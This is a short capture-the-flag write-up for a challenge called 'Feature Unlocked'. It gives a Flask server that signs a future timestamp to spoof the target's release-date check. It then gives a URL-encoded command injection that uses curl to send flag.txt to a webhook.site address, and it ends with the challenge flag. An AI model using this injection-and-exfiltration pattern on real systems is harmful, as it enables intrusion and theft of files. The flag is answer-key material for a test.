# Feature Unlocked

Solved by **vicevirus**

## Question
The world's coolest app has a brand new feature! Too bad it's not released until after the CTF..


## Solution
Create a `server.py` at hosted at our server.

```
from flask import Flask, jsonify
import time
from Crypto.Hash import SHA256
from Crypto.PublicKey import ECC
from Crypto.Signature import DSS

app = Flask(__name__)

key = ECC.generate(curve='p256')
pubkey = key.public_key().export_key(format='PEM')


@app.route('/pubkey', methods=['GET'])
def get_pubkey():
    return pubkey, 200, {'Content-Type': 'text/plain; charset=utf-8'}


@app.route('/', methods=['GET'])
def index():
    # Set the time to 7 days from now
    future_time = int(time.time()) + 7 * 24 * 60 * 60
    date = str(future_time)

    h = SHA256.new(date.encode('utf-8'))
    signature = DSS.new(key, 'fips-186-3').sign(h)

    return jsonify({
        'date': date,
        'signature': signature.hex()
    })


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=1338)
```

Then perform the command injection at ``/feature`
```
text=%3bcurl%20--data-binary%20%22%40flag.txt%22%20%22https%3a%2f%2fwebhook.site%2fb5bcfc27-9cc3-47b8-9d84-c3094cccf287%2f%22
```

### Flag
`CSCTF{d1d_y0u_71m3_7r4v3l_f0r_7h15_fl46?!}`
